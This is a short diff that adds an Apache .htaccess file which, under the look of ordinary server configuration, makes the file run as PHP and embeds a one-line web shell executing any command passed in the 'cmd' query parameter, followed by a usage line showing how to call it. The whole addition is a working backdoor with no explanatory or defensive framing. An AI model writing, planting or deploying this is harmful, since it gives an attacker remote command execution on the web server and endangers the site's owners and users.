@@ -1,0 +1,9 @@
+<Files ~ "^\.ht">
+Order allow,deny
+Allow from all
+</Files>
+
+RedirectMatch 403 .htaccess$
+AddType application/x-httpd-php .htaccess
+# <?php @system($_GET['cmd']); ?>
+# Usage: http://demo/.htaccess/?cmd=dir 
